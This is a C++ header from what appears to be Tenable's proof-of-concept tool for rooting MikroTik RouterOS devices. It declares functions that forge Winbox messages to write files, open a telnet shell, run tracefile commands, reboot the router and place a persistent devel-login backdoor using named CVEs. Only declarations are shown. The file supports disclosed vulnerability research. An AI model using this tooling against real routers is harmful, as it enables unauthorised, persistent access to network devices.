  /*
    Copyright 2019 Tenable, Inc.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                *

    Redistribution and use in source and binary forms, with or without modification,
    are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice, this
        list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
        this list of conditions and the following disclaimer in the documentation
        and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
        may be used to endorse or promote products derived from this software
        without specific prior written permission.

    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
    AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
    IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
    ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
    CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
    SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
    INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
    CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
    ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
    POSSIBILITY OF SUCH DAMAGE.
*/
#ifndef MAKEMESSAGE_HPP
#define MAKEMESSAGE_HPP

#include <string>
#include <vector>
#include <boost/cstdint.hpp>

class WinboxMessage;

namespace msg
{
    /*
     * Basic description of the backdoor location. Described inline
     */
    enum backdoor_location
    {
        k_nova = 1, // /nova/etc/devel-login
        k_flash = 2, // /flash/nova/etc/devel-login
        k_opt = 3, // /pckg/option
        k_opt_sym_or_sqsh = 4, // /pckg/option but it has to be a valid symlink into /bndl or a squshfs
        k_fail = 5
    };

    /*
     * The currently supported exploits. Described inline.
     */
    enum exploits
    {
        k_hackerfantastic_tracefile = 1, // @HackerFantasic's fantastic set tracefile trick: https://github.com/HackerFantastic/exploits/blob/master/mikrotik-jailbreak.txt
        k_cve_2019_3943 = 2, // Directory traversal via fileman: https://www.tenable.com/security/research/tra-2019-16
        k_cve_2018_14847 = 3, // Directory traversal via mproxy: https://nvd.nist.gov/vuln/detail/CVE-2018-14847
        k_none
    };

    /*
     * Forges a version request. This gets routed through /nova/bin/sys2 and it responds
     * with a message containing the platform and version (amongst other things)
     * 
     * \param[in,out] p_msg the msg to store the request in
     * \param[in] p_id the message id
     */
    void make_version_request(WinboxMessage& p_msg, boost::uint32_t p_id);

    /*
     * Creates an open file for write request. In theory, we want to send this to /nova/bin/fileman (72,1)
     * or mproxy (2,2) but this open file thing probably exists elsewhere in RouterOS.
     * For now, I allow the caller to specify any to/sub_to althoug I'm only using 72,1 and 2,2
     * as stated.
     * 
     * \param[in,out] p_msg the msg to store the request in
     * \param[in] p_id the message id
     * \param[in] p_file the file we want to open for writing (this will be appended to /var/pckg/ in RouterOS)
     * \param[in] p_to the binary to route this to
     * \param[in] p_to the handler to route this to
     */
    void make_open_write(WinboxMessage& p_msg, boost::uint32_t p_id, const std::string& p_file, boost::uint32_t p_to, boost::uint32_t p_sub_to);
    
    /*
     * Creates a write request. In theory, we want to send this to /nova/bin/fileman (72,1)
     * or mproxy (2,2) but this open file thing probably exists elsewhere in RouterOS.
     * For now, I allow the caller to specify any to/sub_to althoug I'm only using 72,1 and 2,2
     * as stated.
     * 
     * \param[in,out] p_msg the msg to store the request in
     * \param[in] p_id the message id
     * \param[in] p_session_id the session id provided by the open write response
     * \param[in] p_data the data to write to the file
     * \param[in] p_to the binary to route this to
     * \param[in] p_to the handler to route this to
     */
    void make_write(WinboxMessage& p_msg, boost::uint32_t p_id, boost::uint32_t p_session_id, const std::string& p_data, boost::uint32_t p_to, boost::uint32_t p_sub_to);
    
    /*
     * Creates a request that will reboot the router.
     * 
     * \param[in,out] p_msg the msg to store the request in
     * \param[in] p_id the message id
     */
    void make_reboot(WinboxMessage& p_msg, boost::uint32_t p_id);

    /*
     * Creates a request that will invoke one of the internal shells. Hard coded to invoke Telnet. I've also included
     * some trickery here so that we won't actually drop down into a telnet connection to 127.0.0.1 but instead we'll
     * drop down to a telnet prompt (e.g. telnet>)
     * 
     * \param[in,out] p_msg the msg to store the request in
     * \param[in] p_id the message id
     * \param[in] p_username the username we are using
     */
    void make_term_request(WinboxMessage& p_msg, boost::uint32_t p_id, const std::string& p_username);

    /*
     * After invoking the telnet shell, RouterOS wants us to track every single byte they send us
     * because TCP isn't good enough or something. This will init the tracker and tell them we've
     * received 0 bytes so far.
     * 
     * \param[in,out] p_msg the msg to store the request in
     * \param[in] p_id the message id
     * \param[in] p_session_id the session id provided by the make term request response
     */
    void make_init_term_tracker(WinboxMessage& p_msg, boost::uint32_t p_id, boost::uint32_t p_session_id);

    /*
     * Sends "set tracefile <filepath>" to the telnet command line.
     * 
     * \param[in,out] p_msg the msg to store the request in
     * \param[in] p_id the message id
     * \param[in] p_session_id the session id provided by the make term request response
     * \param[in] p_tracker the current amout of data currently received
     * \param[in] p_trace_command the exact command we want to execute
     */
    void make_set_tracefile(WinboxMessage& p_msg, boost::uint32_t p_id, boost::uint32_t p_session_id, boost::uint32_t p_tracker, const std::string& p_trace_command);

    /**
     * Given a version string, this function will indicate where the backdoor file should
     * be created and if it has any special requirements (e.g. needs to be squashfs).
     * 
     * \param[in] p_version the version string
     * \param[in,out] p_location the file path where the backdoor should be made
     * 
     * \return a backdoor_location indication any special properties of the location
     */
    backdoor_location find_backdoor_location(const std::string& p_version, std::string& p_location);

    /**
     * Given the version string, determine which exploits we can use to root the router.
     * 
     * \param[in] p_version the version string
     * 
     * \return a vector of exploits we could use
     */
    std::vector<exploits> find_supported_exploits(const std::string& p_version);

    /**
     * \return the string version of the provided exploit
     */
    std::string sploit_string(exploits p_exploits);

    /**
     * Outputs a warning message to cout indicating if the installed backdoor is persistent.
     * 
     * \param[in] p_do_symlink indicates if the user requested a symlink get created
     * \param[in] p_do_persistence indicates if the user requested persistence
     */
    void activation_message(backdoor_location p_type, bool p_do_symlink, bool p_do_persistence);

    /**
     * If the version requires a reboot to persist then this function asks the user
     * if they'd like to reboot the router.
     * 
     * \param[in] p_do_symlink indicates if the user requested a symlink get created
     * \param[in] p_do_persistence indicates if the user requested persistence
     * 
     * \return true if they want to reboot and false otherwise.
     */
    bool reboot_message(backdoor_location p_type, bool p_do_symlink, bool p_do_persistence);

    /**
     * Outputs a warning message to cout indicating if the installed backdoor is persistent.
     */
    void persistence_warning(backdoor_location p_type);
}

#endif